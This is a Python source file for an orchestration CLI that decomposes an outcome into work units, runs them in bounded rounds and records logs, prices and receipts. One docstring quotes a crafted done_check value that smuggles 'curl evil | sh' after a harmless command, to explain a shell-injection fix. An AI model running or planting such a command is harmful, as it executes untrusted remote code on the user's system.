#!/usr/bin/env python3
"""brother_run: a plain outcome in, a verified delivery report out.

P0.1 of the composition wave (docs/plan/P0-COMPOSITION-WAVE-2026-08-30.md):
stop making a person drive the spine by hand. Every piece this calls already
exists and is already tested on its own (door.py, work_record.py,
loop_bridge.py, model_worker.py, integrate.py, claim_store.py); this is the
one door in front of them, not a second implementation of any of them.

FLOW, three real commands run in order, no internal command visible to the
caller:

  1. door.py turns the outcome into a canonical Work document, stored in a
     RUN-SCOPED directory under docs/plan/runs/<timestamp>-<slug>/ so two
     runs never collide and a run's own plan and claims sit beside each
     other. A refusal (door retried and still refused, or the decomposer is
     missing) is surfaced VERBATIM and this exits nonzero without touching
     loop_bridge at all.

  2. loop_bridge.py claims the ready batch and runs it, worker DEFAULTED to
     scripts/model_worker.py (P0.2: loop_bridge.py's own --worker-cmd
     default, not reimplemented here). Called IN-PROCESS (imported, not
     subprocessed) since its main() already returns a plain exit code and
     permits that.

  3. the delivery report: what integrated, what was refused and why, and the
     canonical revision before and after. Read from the claim store (the
     durable record of how each unit ended) and from git (the actual
     revision), not from a worker's own account of itself, for the same
     reason integrate.py reads git rather than a worker's claim.

THE DRAIN, which is the execution contract a maintainer must predict (the
loop lives in main(), around line 521, and its inline comments carry the
incidents that shaped it):

  - loop_bridge is called in ROUNDS, at most 25. Each round claims and runs
    only the units dispatchable at its start, because graph_loop.plan()
    computes the ready set from the Work document's own status fields.
  - After every round this script WRITES INTEGRATION BACK into the Work
    document (_mark_integrated), so a unit whose dependency integrated in
    round one becomes claimable in round two. Without that write-back a
    finished unit is re-offered forever and its dependents starve (measured
    live on the first real run).
  - BOUNDED REPAIR: a unit that integrate.py classifies NEEDS-REPAIR-ON-NEW-
    BASE stays SCHEDULED and may be claimed again, but only while its claim
    store attempt count is under MAX_UNIT_ATTEMPTS. Attempt growth on a
    repairable unit counts as progress; nothing else does.
  - TERMINATION: a round that neither grows the integrated set nor spends a
    bounded repair attempt ends the drain, so a stuck graph stops instead of
    spinning. The run is COMPLETE when no units remain; otherwise the report
    names what remained and why the drain stopped (attempt bound exhausted,
    or no progress).
  - Authoritative integration stays in integrate.py, serially, reading git
    rather than any worker's account of itself; this loop never merges.

Neither the door's decomposer nor the worker's model is named here: both
already read their own command from an environment variable (DOOR_MODEL_CMD,
MODEL_WORKER_CMD) or fall back to the real `claude` CLI, and this script
inherits whatever the caller's environment already sets rather than adding a
second place a model id could be spelled differently.

Python 3, standard library only. No network calls of its own.

origin: invoked directly as its own CLI (main(), below, `python3
scripts/brother_run.py "<outcome>"`, wired to argparse at line 327), by a
human or an orchestrating process; this module's own docstring calls
itself "the one door" in front of the spine's separately-tested pieces
(lines 1-8 above). scripts/product_acceptance.py's own docstring confirms
this is the intended entry point: "THROUGH THE PUBLIC ENTRY POINT this
time: scripts/brother_run.py" (product_acceptance.py, line 5), and
scripts/check_all.sh names the same thing: "public entry point (a plain
outcome sentence into brother_run.py)" (check_all.sh, line 357). It is
also packaged for direct human use as bundle/runtime/brother-run, mirrored
by scripts/bundle_runtime.py rather than hand-copied (confirmed: grep -rl
brother_run scripts bundle/runtime lists bundle/runtime/brother-run and
bundle/runtime/brother_run.py alongside this file). scripts/fault_lab.py
and scripts/product_acceptance.py also drive it as a subprocess/in-process
call for their own test scenarios (fault_lab.py, lines 400 and 465;
product_acceptance.py, line 16), and scripts/limit_watch.py prints its
path as a suggested next command for a human to run by hand
(limit_watch.py, lines 164-166) rather than calling it itself.

PRODUCER: this module is the producer of the two files it writes
directly. _write_run_target() (lines 153-159) writes target.json via a
plain open(...,"w") plus json.dump({"cwd": ...}), called once at run
start. _mark_integrated() rewrites the run's own Work document in place,
marking each unit DONE after real integration. Since E61 that rewrite, and
the nine other stamps beside it, no longer truncate the real file: every
one calls work_record.write_record(record_path, doc), which writes a temp
file beside the target, fsyncs it and os.replace()s it under the claim
store's lock, so a run killed mid-stamp leaves a whole document. The Work
document is first CREATED by a separate module, door.py, invoked as a
subprocess in run_door() (lines 116-139) and read back there (lines
136-137); this module only updates that document's status fields
afterward, it does not originate it. Nothing else in this repo writes
target.json or updates a run's status field this way (verified: grep -rln
"_mark_integrated\\|TARGET_FILENAME" scripts bundle/runtime finds only
this file and its generated mirror, bundle/runtime/brother_run.py).
"""
import argparse
import contextlib
import datetime
import hashlib
import io
import json
import os
import re
import shlex
import shutil
import statistics
import subprocess
import sys
import tempfile
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)
import claim_store  # noqa: E402
import decide  # noqa: E402
import door  # noqa: E402
import integrate  # noqa: E402
import journal  # noqa: E402
import loom  # noqa: E402
import loop_bridge  # noqa: E402
import receipt_door  # noqa: E402
import run_heartbeat  # noqa: E402
import work_record  # noqa: E402

NODATA = "NO-DATA"
DOOR = os.path.join(HERE, "door.py")
TARGET_FILENAME = "target.json"
CLAIMS_FILENAME = "claims.json"
#: E73.2's continuity capsule (scripts/continuity.py), written beside the
#: journal at each lifecycle checkpoint. The literal is duplicated here
#: rather than imported from continuity.py (which itself imports this
#: module) so ENGINE_JSON_FILES, below, can be a plain module-level constant
#: with no import-order cycle; continuity.CAPSULE_FILENAME names the same
#: string.
CAPSULE_FILENAME = "capsule.json"
#: Everything the engine says to itself, verbatim, under the run's own
#: directory. Deliberately NOT a .json name: _find_work_doc() picks the Work
#: document as "the one .json that is neither claims nor target", so a third
#: json file in a run directory would break --resume and --continue.
LOG_FILENAME = "run.log"
#: --continue with no number: pick automatically among what discovery
#: finds. Distinct from None (the flag was never given) and from a digit
#: string (--continue N), so argparse's own nargs="?" const is this rather
#: than an empty string, which "" == falsy could be mistaken for "unset".
CONTINUE_BARE = "\0bare\0"

#: T2: every attempt a unit is given lands in its own subdirectory here,
#: under the run directory, and a retry never touches an earlier attempt's
#: directory (see _write_attempt_trace). Named apart from claims.json and
#: target.json so _find_work_doc's "the one *.json that is neither of those"
#: rule stays correct: this is a directory, not a *.json file at run_dir's
#: own level, so it never becomes a candidate Work document.
ATTEMPTS_DIRNAME = "attempts"

#: E81: THE RECEIPT A RUN LEAVES BEHIND, and the path this repository's own
#: README documents. The codex EVAD trial of 2026-09-04 ran the README's toy
#: delivery against the public v1.0.1 clone: two files were edited, the
#: process ended, and a find over the tree for a receipt file returned
#: nothing, because the delivery report went to stdout and nowhere else.
#: receipt_door.receipt_record() already built the machine view of a run
#: (E72.1) and nothing ever wrote it down; _write_receipt (below) does, and
#: main() prints this path as its LAST stdout line so a caller that kept
#: only the tail still holds the proof. A DIRECTORY under the run
#: directory, for the same reason screens/ is one: _find_work_doc picks the
#: Work document as "the one *.json that is neither claims nor target", so a
#: receipt.json sitting at run_dir's own level would break --resume and
#: --continue (and fault_lab.py keeps its own copy of that name list, which
#: this way needs no edit at all).
RECEIPT_DIRNAME = "receipt"
RECEIPT_FILENAME = "receipt.json"

#: How many outer claims (not in-lane repair sub-attempts, which loop_bridge
#: already bounds itself via --max-attempts) a single unit may be given
#: across the whole drain before the drain gives up on it. Matches the
#: estate's own repair budget elsewhere (bm_repair.DEFAULT_MAX_ATTEMPTS,
#: loop_bridge's own --max-attempts default), reused here for the same
#: reason: a unit that has not gone green in that many outer tries is
#: treated as exhausted rather than retried forever.
# ponytail: a flat per-unit count, not a backoff schedule; revisit if a real
# unit ever needs more than three outer attempts to prove that is not enough.
MAX_UNIT_ATTEMPTS = 3

#: THE PER-ATTEMPT TIME LIMIT, in seconds, kept beside the attempt cap above
#: because the two together are the whole bound on one piece of work: at
#: most MAX_UNIT_ATTEMPTS outer attempts, each stopped after this long.
#:
#: WHAT IT BOUNDS: one attempt's worker process end to end, which is the
#: model call model_worker.py makes, its commit, and its own run of the
#: unit's done_check. The spawn adapter loop_bridge loads
#: (bm_worker_spawn.SpawningWorker) stops the process at this age and
#: reports the attempt unavailable, so it fails like any other attempt and
#: the drain's retry rule above applies. model_worker.py's own 1200 second
#: model timeout sits INSIDE this one and can never be the bound that fires
#: first, which is why the run record's "up to twenty minutes each" was
#: five minutes too generous (measured 2026-09-03: the adapter's default
#: is 900).
#:
#: WHY 900: it is the adapter's own DEFAULT_TIMEOUT_SECONDS, whose reason
#: is stated where it lives ("an adapter with NO timeout is the thing that
#: turns one hung worker into a session that never ends"), and it sits
#: under the twenty minute claim lease (claim_store.DEFAULT_TTL_SECONDS),
#: so a worker is always stopped while its own claim is still live: its
#: release is recorded by the owner that made the claim, never reclaimed
#: mid-run by a peer that saw the lease expire.
#:
#: NOTHING HERE ENFORCES THE NUMBER; the adapter does. _worker_time_limit()
#: reads the loaded adapter's real value, so the intent screen prints what
#: will actually happen and names any disagreement with this constant
#: rather than hiding it behind a number spelled twice.
WORKER_TIME_LIMIT_SECONDS = 900

#: Shared by _reexecute_check and _check_passes_now: the SAME budget for a
#: check run before any work (does it already pass?) and after (did the
#: work make it pass?), because a check given more time on one side than the
#: other is not the same measurement taken twice.
CHECK_RUN_TIMEOUT_SECONDS = 600

#: I3, the screen loom: the charter's own four human points (products/
#: brothermode/docs/NORTH-STAR-CHAIN.md, "the intent that starts the chain,
#: any forcing condition where guessing is the danger, the release decision,
#: and the acceptance that closes it"), in the order a run may pause at them.
#: loom.py already gives the last two a place to put the answer (its own
#: docstring: "this only gives the last two a place to put the answer");
#: this file's own _human_moment (below) is what poses all four as a
#: decide.py screen, never a fifth moment and never these four out of order.
MOMENTS = ("intent", "forcing-condition", "release", "acceptance")


class RunLog:
    """Two surfaces, one for the person and one for the engineer.

    THE MACHINERY IS NOT DELETED, it is moved. Every internal line the drain
    used to print at the user (loop_bridge's round output, the claim store's
    own vocabulary, the scheduler's refusal wording) goes to the run's log
    file VERBATIM, where an engineer debugging a run needs exactly that. The
    user surface gets plain progress sentences instead, which is the
    productization directive's own rule and the door study's first diagnosis
    (docs/plan/DOOR-REDESIGN-STUDY-2026-08-31.md, lines 10 to 13).

    `note` logs only. `say` prints AND logs, so the log is a superset of the
    surface and a support question can always be answered from one file."""

    def __init__(self):
        self.path = None
        self.lines = []

    def to(self, run_dir):
        """Point at a run directory, once it exists, and flush what was
        buffered before it did (the door's own output, mostly)."""
        self.path = os.path.join(run_dir, LOG_FILENAME)
        self._flush()

    def note(self, text):
        self.lines.append(str(text).rstrip("\n"))
        self._flush()

    def say(self, text):
        print(text)
        self.note(text)

    def _flush(self):
        if not self.path:
            return
        try:
            with open(self.path, "w", encoding="utf-8") as fh:
                fh.write("\n".join(self.lines) + "\n")
        except OSError as exc:
            # Said ONCE, then the log is given up on: a delivery must not die
            # because its own bookkeeping could not be written, and a message
            # repeated per line would drown the surface this rule protects.
            print("brother_run: the run log could not be written to %s (%s); "
                  "the run continues without it" % (self.path, exc),
                  file=sys.stderr)
            self.path = None


def slugify(outcome, limit=40):
    """A filesystem-safe fragment of the outcome, for a readable run directory
    name. Not an id: work_record.py still derives the real work_id."""
    out, prev_dash = [], False
    for ch in outcome.lower():
        if ch.isalnum():
            out.append(ch)
            prev_dash = False
        elif not prev_dash:
            out.append("-")
            prev_dash = True
    return "".join(out).strip("-")[:limit] or "outcome"


def run_dir_for(outcome, runs_root, clock=None):
    """A fresh, run-scoped directory under docs/plan/runs of `runs_root`.

    `runs_root` is DELIBERATELY NOT the target --cwd. integrate.py refuses to
    touch a canonical tree that is dirty, and a Work document plus a claims
    file sitting untracked inside the very repo being integrated into would
    make canonical dirty before the first unit ever ran, which is exactly the
    mistake test_spine.py's own setUp avoids by keeping its plan and claims
    outside self.repo. So this defaults to Brother's own repository, the tool
    keeping its bookkeeping with itself rather than inside whatever it is
    orchestrating."""
    now = clock or datetime.datetime.now()
    stamp = now.strftime("%Y%m%dT%H%M%S")
    return os.path.join(os.path.abspath(runs_root), "docs", "plan", "runs",
                        "%s-%s" % (stamp, slugify(outcome)))


#: Where the default runs root goes when this tool's own repository cannot be
#: written. NOT `<cwd>/.brother-runs`: records inside the target are exactly
#: what makes it dirty, and a run pointed there once spun 11 rounds of live
#: worker calls against a permanently dirty canonical before a person killed
#: it (vault, 2026-08-30). The temp root is a granted writable root under a
#: Codex workspace-write turn, which is the install this fallback exists for.
FALLBACK_RUNS_DIR = "brother-runs"


def _resolve_runs_root(requested, default=None, probe=None):
    """The runs root to use, plus the line to print when it is not the one
    asked for. An EXPLICIT --runs-root is honored as given and never moved:
    a path the caller named that cannot be written is the caller's error and
    has to surface as itself.

    THE DEFAULT IS PROBED BY DOING, not by asking. A plugin install puts
    this tool under a read-only root, and on the founder's 2026-09-05 public
    run the first engine call died with an uncaught PermissionError deep in
    work_record.create's own os.makedirs, naming the installed plugin's docs
    path. os.access would have answered True there: the refusal came from
    the sandbox, not from a mode bit, so the only honest probe is the same
    makedirs the run will do."""
    if requested:
        return os.path.abspath(requested)
    root = os.path.abspath(default or REPO_ROOT)
    probe = probe or (lambda path: os.makedirs(path, exist_ok=True))
    try:
        probe(os.path.join(root, "docs", "plan", "runs"))
        return root
    except OSError as exc:
        fallback = os.path.join(tempfile.gettempdir(), FALLBACK_RUNS_DIR)
        print("brother_run: the default run directory under %s cannot be "
              "written (%s), so this run's records go to %s instead. Pass "
              "--runs-root to choose your own; keep it outside the "
              "repository being worked on." % (root, exc, fallback))
        return fallback


def run_door(outcome, store, dry_run=False, cwd=None):
    """door.py, exactly as its own test suite drives it. Returns
    (ok, record_or_none, text): text is door's own combined stdout+stderr,
    verbatim, since a refusal explains itself in words this should not
    paraphrase.

    `cwd`, the TARGET repository, is passed through as the decomposer's own
    working directory (measured 2026-08-31, E7): door.py's ask_decomposer()
    spawns the real model with no cwd of its own, so it silently inherited
    whichever directory the caller (a person, or this script) happened to be
    sitting in when brother_run.py was invoked. Run from this engine's own
    checkout, as documented usage does, the decomposer saw THIS repo's files
    and wrote a plan referencing them (a live run put a target unit's write
    scope at 'scripts/integrate.py', a real file in the ENGINE, not the
    outcome's actual target). `--store` stays an absolute path, so nothing
    else in door.py depends on its own cwd; only where the decomposer looks
    when it reasons about "the current directory" changes."""
    args = [sys.executable, DOOR, outcome, "--store", store]
    if dry_run:
        args.append("--dry-run")
    proc = subprocess.run(args, capture_output=True, text=True, cwd=cwd)
    text = (proc.stdout or "") + (proc.stderr or "")
    if proc.returncode != 0 or dry_run:
        return proc.returncode == 0, None, text

    files = [f for f in os.listdir(store) if f.endswith(".json")] \
        if os.path.isdir(store) else []
    if len(files) != 1:
        return False, None, text + (
            "\n%s: expected exactly one Work document in %s after door "
            "reported success, found %d" % (NODATA, store, len(files)))
    path = os.path.join(store, files[0])
    with open(path, encoding="utf-8") as fh:
        record = json.load(fh)
    record["path"] = path
    return True, record, text


#: Every *.json the engine itself writes beside the Work document, so
#: _find_work_doc can tell the document from the bookkeeping: the claim
#: store, the target marker, and loop_bridge's usage sidecar, named through
#: its own function rather than spelled again here. THE SIDECAR WAS THE
#: THIRD JSON THIS FILE'S OWN WARNING (LOG_FILENAME, above) FEARED: it was
#: added beside claims.json without joining this list, and nothing noticed
#: because no run ever actually recorded usage (the installed adapter
#: dropped it, see _source_tools_dir) until 2026-09-03, when the first run
#: that did could no longer be resumed: --resume, --continue and the
#: unfinished-run discovery all read the document through this one test.
ENGINE_JSON_FILES = frozenset((
    CLAIMS_FILENAME, TARGET_FILENAME, CAPSULE_FILENAME,
    os.path.basename(loop_bridge.usage_sidecar_path(CLAIMS_FILENAME))))


def _find_work_doc(run_dir):
    """The run's Work document: the one *.json file in `run_dir` that is not
    one of the engine's own bookkeeping files (ENGINE_JSON_FILES). None if
    the directory holds zero or more than one such file."""
    if not os.path.isdir(run_dir):
        return None
    files = [f for f in os.listdir(run_dir)
             if f.endswith(".json") and f not in ENGINE_JSON_FILES]
    return os.path.join(run_dir, files[0]) if len(files) == 1 else None


def _write_run_target(run_dir, cwd):
    """Record which repository this run is FOR, written once at run start
    (never on resume, which reuses whatever a run already recorded) so a
    later --continue can match a crashed run back to the repo a bare
    invocation is sitting in, without a person naming the run directory."""
    with open(os.path.join(run_dir, TARGET_FILENAME), "w", encoding="utf-8") as fh:
        json.dump({"cwd": os.path.abspath(cwd)}, fh, indent=1)


def _read_run_target(run_dir):
    path = os.path.join(run_dir, TARGET_FILENAME)
    if not os.path.isfile(path):
        return None
    try:
        with open(path, encoding="utf-8") as fh:
            return json.load(fh).get("cwd")
    except (OSError, ValueError):
        return None


#: Where a finished run's own measured wall clock ends up: build_cost_block
#: puts wall_clock_seconds in the cost block, build_report prints the block
#: one field per line, and main() writes that whole report into the run log.
#: So the figure below is READ BACK from the engine's own receipt, never
#: re-derived from a directory timestamp, and a run that never finished (no
#: report, no cost block) simply contributes nothing.
_WALL_CLOCK_IN_LOG = re.compile(r"wall_clock_seconds:\s*([0-9]+(?:\.[0-9]+)?)")


def previous_run_durations(runs_root, cwd, limit=3):
    """The measured wall clock, in seconds, of the last `limit` finished runs
    against `cwd`, newest first.

    E46: the intent screen used to say only that how long a run takes is not
    knowable in advance, which is honest and unhelpful in the same breath. It
    is still not predictable, but what earlier runs against this same target
    ACTUALLY took is measured and sitting on disk, and three real figures
    tell a person more about the wait ahead than any estimate would.

    Never guesses: a run with no target marker is not matched to this target,
    a run with no log or no cost block in it contributes nothing, and an
    unreadable log is skipped rather than raising."""
    runs_dir = os.path.join(os.path.abspath(runs_root), "docs", "plan", "runs")
    if not os.path.isdir(runs_dir):
        return []
    target = os.path.abspath(cwd)
    out = []
    try:
        names = sorted(os.listdir(runs_dir), reverse=True)
    except OSError:
        return []
    for name in names:
        if len(out) >= limit:
            break
        run_dir = os.path.join(runs_dir, name)
        if not os.path.isdir(run_dir):
            continue
        run_cwd = _read_run_target(run_dir)
        if run_cwd is None or os.path.abspath(run_cwd) != target:
            continue
        try:
            with open(os.path.join(run_dir, LOG_FILENAME),
                      encoding="utf-8") as fh:
                text = fh.read()
        except OSError:  # sbe: allow-silent reader-only: a run whose log cannot be opened contributes no duration and the sentence below says how many were measurable
            continue
        found = _WALL_CLOCK_IN_LOG.findall(text)
        if not found:
            continue
        try:
            out.append(float(found[-1]))
        except ValueError:  # sbe: allow-silent reader-only: a log line whose number will not parse contributes no duration, and nothing here rewrites the run
            continue
    return out


def previous_runs_line(durations):
    """One sentence naming what earlier runs against this target really took,
    or "" when none of them is measurable. Separated from the reading above
    so the wording is testable without a run directory."""
    if not durations:
        return ""
    return ("The last %d run(s) against this target really took %s "
            "(measured, newest first); this one is not predictable from "
            "them, but it is the only evidence there is."
            % (len(durations),
               ", ".join("%ds" % int(round(d)) for d in durations)))


#: E90's price block, and why its field names echo the cost block above.
#: The founder's ruling on docs/decisions/light-path-for-small-changes-
#: 2026-09-04.json was option B, "say the price before the run": no engine
#: path changes, the figure simply moves from the receipt a person reads
#: AFTER the wait to the screen posed BEFORE it. So this block and
#: build_cost_block's block are two readings of one thing, this run's
#: price, and they share a vocabulary on purpose:
#: `wall_clock_seconds_expected` here is the same measurement
#: `wall_clock_seconds` reports there, once it has actually happened. A
#: reader who has learned one has learned both.
PRICE_FIELDS = ("model_sessions", "previous_runs_measured",
                "wall_clock_seconds_expected", "wall_clock_seconds_range")

#: THE TWO FIGURES THE NO-HISTORY BRANCH QUOTES, and why quoting them is not
#: the invented duration this file refuses everywhere else. Row S18 asks the
#: intent screen to state THE WAIT before the wait starts, and a first run
#: against a fresh target has no history of its own to derive one from, which
#: is exactly the situation a person with a one line change is in. So the
#: sentence stops guessing about THIS target and quotes what this estate
#: actually timed, each with its instrument beside it:
#:   * under 5 seconds of ENGINE wall clock for a tiny task driven through
#:     this same entry point, measured by scripts/tiny_task_cost.py (two
#:     cases, a one line docs fix and a one line code fix with an existing
#:     test; six readings on 2026-09-05 spanned 1.61s to 3.86s, the last
#:     pair recorded under benchmarks/results/tiny-task-2026-09-05.json).
#:     A BOUND AND NOT A POINT ESTIMATE, deliberately: the spread above is
#:     the same code on the same machine minutes apart, so a single figure
#:     would read as a precision this measurement does not have;
#:   * 568.03 seconds END TO END for the one tiny task this estate ever timed
#:     against a real model, the t7 report of 2026-09-04 that README.md's
#:     limits section already quotes.
#: Both are measurements with a named instrument, neither is a prediction for
#: the run in front of you, and the sentence says so in those words.
MEASURED_TINY_TASK_ENGINE_SECONDS = 5
MEASURED_TINY_TASK_REAL_MODEL_SECONDS = 568.03


def build_price_block(model_sessions, durations):
    """What this run is about to cost, built before any worker starts.

    `model_sessions` is COUNTED, never estimated: one planning session (the
    decomposer the door already asked) plus one worker session per piece of
    work in the plan on disk. That count is the honest unit of price here,
    because the measurement behind the ruling found the engine's own code
    costs a median 2.58 seconds of a 568 second run, so what a person waits
    for is model sessions and not this code.

    `durations` is previous_run_durations' output for this same target, so
    an expected wall clock is DERIVED from measured runs and from nothing
    else. With no measurable earlier run both wall-clock fields read
    NO-DATA naming why, never a guessed figure: this estate does not invent
    a duration to comfort somebody. That is not in tension with the
    governor line further down, which says the same thing in its own words;
    a figure read off real finished runs is evidence, not a prediction."""
    if durations:
        expected = round(statistics.median(durations), 1)
        span = "%ds to %ds" % (int(round(min(durations))),
                               int(round(max(durations))))
    else:
        expected = ("%s: no earlier run against this target left a measured "
                    "wall clock, and none is guessed" % NODATA)
        span = "%s: nothing measured to take a range from" % NODATA
    return {"model_sessions": model_sessions,
            "previous_runs_measured": len(durations),
            "wall_clock_seconds_expected": expected,
            "wall_clock_seconds_range": span}


def price_paragraph(block):
    """The price block in plain words, for the intent screen (and so, since
    E91 put every screen's own summary into the run log, for run.log too).
    Split from the block above so the wording is testable without a run."""
    sessions = block.get("model_sessions") or 0
    counted = ("this run opens %d model session(s), one to plan the work and "
               "one for each of the %d piece(s) of work in the plan."
               % (sessions, max(0, sessions - 1)))
    # S18's other half, said in the same breath as the price: WHICH ceremony
    # a one piece plan already skips, so nobody braces for a cost this run is
    # not charging. Measured, not asserted: a one unit run's own
    # run.log carries "was not reviewed: NO-DATA: this unit crossed no risk
    # boundary" and "no release screen: a plain change", and its drain runs a
    # single round with no dependency wait. The planning pass is NOT skipped
    # and the sentence says so, because the founder's ruling of 2026-09-04
    # kept the door's shape and asked it to state the price instead.
    if sessions - 1 == 1:
        counted += (" This plan holds one piece of work, so the run already "
                    "skips what a larger one pays for: no dependency round, "
                    "no reviewer unless the piece crosses a risk boundary, "
                    "and no release screen. It still runs the planning pass, "
                    "deliberately.")
    measured = block.get("previous_runs_measured") or 0
    if measured:
        wait = ("The last %d run(s) against this target really took %s "
                "(measured), so their median, %ss of wall clock, is what "
                "this one is expected to cost, derived from those and from "
                "nothing else."
                % (measured, block.get("wall_clock_seconds_range"),
                   block.get("wall_clock_seconds_expected")))
    else:
        wait = ("The expected wall clock reads %s: no earlier run against "
                "this target left a measured one, and this estate will not "
                "invent a duration. What it has timed, elsewhere and with an "
                "instrument named beside each figure: a genuinely tiny task "
                "driven through this same entry point cost the engine itself "
                "under %d seconds of wall clock (scripts/tiny_task_cost.py), "
                "and the one tiny task ever timed end to end against a real "
                "model took %.2f seconds on 2026-09-04, nearly all of it the "
                "model answering rather than this code. Neither figure is a "
                "prediction for this run: they are what the wait has been."
                % (NODATA, MEASURED_TINY_TASK_ENGINE_SECONDS,
                   MEASURED_TINY_TASK_REAL_MODEL_SECONDS))
    return ("Price, before anything is claimed or run: %s %s What the same "
            "edit would cost you by hand is not measured here, and nothing "
            "below claims to beat it: the run proves what it does."
            % (counted, wait))


def _is_unfinished(record):
    """A run is terminal once every row it decomposed into is DONE. A run
    with no rows at all (should not happen past a real door success, but
    never trusted) is not offered as something to continue."""
    rows = record.get("rows") or record.get("units") or []
    return bool(rows) and any(r.get("status") != "DONE" for r in rows)


def find_unfinished_runs(runs_root, cwd):
    """Every non-terminal run under `runs_root` whose recorded target cwd
    matches `cwd`, oldest first (each run directory's own timestamp prefix
    sorts chronologically). A run with no target marker (predates this
    feature, or belongs to a foreign runs-root layout) is never guessed
    into a match. Returns a list of (run_dir, outcome, record) tuples;
    `record["path"]` is set to the Work document's path, same as
    run_door()."""
    runs_dir = os.path.join(os.path.abspath(runs_root), "docs", "plan", "runs")
    if not os.path.isdir(runs_dir):
        return []
    target = os.path.abspath(cwd)
    out = []
    for name in sorted(os.listdir(runs_dir)):
        run_dir = os.path.join(runs_dir, name)
        if not os.path.isdir(run_dir):
            continue
        run_cwd = _read_run_target(run_dir)
        if run_cwd is None or os.path.abspath(run_cwd) != target:
            continue
        doc_path = _find_work_doc(run_dir)
        if not doc_path:
            continue
        try:
            with open(doc_path, encoding="utf-8") as fh:
                record = json.load(fh)
        except (OSError, ValueError):
            continue
        if not _is_unfinished(record):
            continue
        record["path"] = doc_path
        out.append((run_dir, record.get("outcome") or "(no outcome recorded)",
                    record))
    return out


def _normalize_outcome(text):
    """Whitespace-collapsed, case-folded outcome text, for a deterministic
    comparison that tolerates a stray space or capital letter without
    pulling in a fuzzy-matching library."""
    return " ".join((text or "").split()).strip().lower()


def _outcomes_match(new_outcome, recorded_outcome):
    """True when `new_outcome` is the SAME ask as `recorded_outcome`: exact
    after normalization, or one containing the other (the high-similarity
    form named in the gap-2 fix: a person re-typing a slightly shortened or
    lengthened version of what they already asked for). Deliberately never
    a similarity score; either it is the same outcome or it is not."""
    a, b = _normalize_outcome(new_outcome), _normalize_outcome(recorded_outcome)
    if not a or not b:
        return False
    return a == b or a in b or b in a


def _next_command(cwd, runs_root, lead):
    """E81: the one copyable line a refusal ends on.

    A refusal that names no next command leaves the person who typed the
    first one with nothing to type second, which is exactly what the
    2026-09-04 stranger trial found. This builds that line out of the
    arguments THIS process actually received, so it works verbatim when
    pasted back into the same shell: the same interpreter, the same
    absolute path to this script, the same --cwd, and --runs-root only when
    one was chosen (the default is this tool's own repository, and printing
    it would turn a short line into a long one for no gain).

    `lead` is whatever comes before --cwd: the outcome to ask again when
    the door refused and left nothing behind, or --continue (with its N
    when the repository holds more than one unfinished run) when there IS a
    run to resume. Every element is shell-quoted, so a path or an outcome
    holding a space or a quote survives the round trip."""
    parts = [sys.executable, os.path.abspath(__file__)] + list(lead)
    parts += ["--cwd", os.path.abspath(cwd)]
    if os.path.abspath(runs_root) != os.path.abspath(REPO_ROOT):
        parts += ["--runs-root", os.path.abspath(runs_root)]
    return " ".join(shlex.quote(str(p)) for p in parts)


def _guard_record_checks(record):
    """(refusals) for a Work document that came off DISK, one (unit_id,
    reason) per done_check the door's own guard refuses; empty means every
    check passed the fence.

    THE HOLE THIS CLOSES (security review 2026-09-04, Critical): a unit's
    done_check reaches _reexecute_check and _check_without with shell=True,
    and door.guard_adopted_check used to stand only between a MODEL-REWRITTEN
    replacement and that shell. A record is not this engine's own output on
    three paths: --resume takes a run directory named on the command line,
    --continue and the implicit resume find one by its recorded cwd, and any
    of those directories can be a checkout a stranger shipped. So a crafted
    record's `"done_check": "python3 x.py; curl evil | sh"` was arbitrary
    shell the moment somebody resumed it.

    The fence is the SAME one, not a second dialect: build_prompt already
    asks the model for "a single shell command", so a record this engine
    itself created passes unchanged, and a record that does not was never
    written to the contract the door states.

    The refusal reason names the rule broken and never the refused command,
    per guard_adopted_check's own contract: echoing it back would put the
    crafted string in front of the next reader."""
    refusals = []
    for row in record.get("rows") or record.get("units") or []:
        command = str(row.get("done_check") or "").strip()
        if not command:
            # A row with no check at all is a different problem, already
            # reported by the precheck stamp and the receipts as
            # "no done_check was recorded for this unit". Silence here is
            # not a pass: nothing is executed either way.
            continue
        allowed, reason = door.guard_adopted_check(command)
        if not allowed:
            refusals.append((str(row.get("id") or "(unnamed unit)"), reason))
    return refusals


def _source_tools_dir(repo_root=None, env=None):
    """The product's OWN worker adapter directory when this engine runs from
    a checkout that carries it (products/brothermode/tools beside scripts/),
    else None. loop_bridge.load_parts() looks for the adapter in the
    INSTALLED runtime first (a plugin cache, a skills directory) and never
    in this repository's own products tree, so the engine in this checkout
    ran brothermode 3.4.4's adapter out of the plugin cache, which predates
    the usage passthrough and dropped every token count model_worker.py had
    already read off the model's own answer (the toy's run 5, 2026-09-03:
    every token field NO-DATA on a genuine success, no usage sidecar written
    at all). An engine that ships a product runs that product's own source
    when it sits beside it; an installed bundle has no such tree, so this
    returns None there and load_parts keeps its own order.

    THE OVERRIDE STILL WINS. loop_bridge's own BROTHER_RUNTIME_ROOT names
    the runtime a caller chose on purpose (the acceptance harness's area 5
    points it at an adapter whose timeout is five seconds, to reap a hung
    worker in test time), so when `env` carries it this returns None and
    load_parts resolves that runtime first, exactly as its docstring
    promises; a source preference that silently outranked an explicit
    override is what made the hang test run the 900 second adapter."""
    env = os.environ if env is None else env
    if (env.get(loop_bridge.RUNTIME_ENV_VAR) or "").strip():
        return None
    path = os.path.join(repo_root or REPO_ROOT, "products", "brothermode",
                        "tools")
    return path if os.path.isfile(os.path.join(path, "bm_worker_spawn.py")) \
        else None


def _write_capsule(run_dir):
    """E73.2's own hook, called beside every lifecycle journal.append site
    below: writes this run's continuity capsule (scripts/continuity.py,
    E73.1) to <run_dir>/capsule.json, so a killed run's resume screen has
    something fresher than the raw journal to read.

    IMPORTED LOCALLY, NOT AT MODULE TOP: continuity.py itself does
    `import brother_run`, and this module already carries a long list of
    top-level imports (claim_store, decide, door, integrate, journal, loom,
    loop_bridge, receipt_door) that continuity.py does not need to see
    while it defines its own functions. A local import here is resolved
    the first time a checkpoint fires, by which point this module has
    finished loading end to end, so the cycle that would bite a module-
    level import never has a chance to.

    AVAILABILITY OVER BOOKKEEPING, journal.append's own stance: a capsule
    write failure must never stop the run being recorded. continuity.
    write_capsule already prints its own stderr line; this also journals
    the failure as its own event, so a degraded capsule leaves a permanent
    trace beside the checkpoint it belongs to, not just a line that
    scrolls off a terminal."""
    import continuity
    ok, problem = continuity.write_capsule(run_dir)
    if not ok:
        journal.append(run_dir, "capsule.write_failed",
                       parent_ids=journal.previous(run_dir),
                       payload={"reason": problem[:200]})


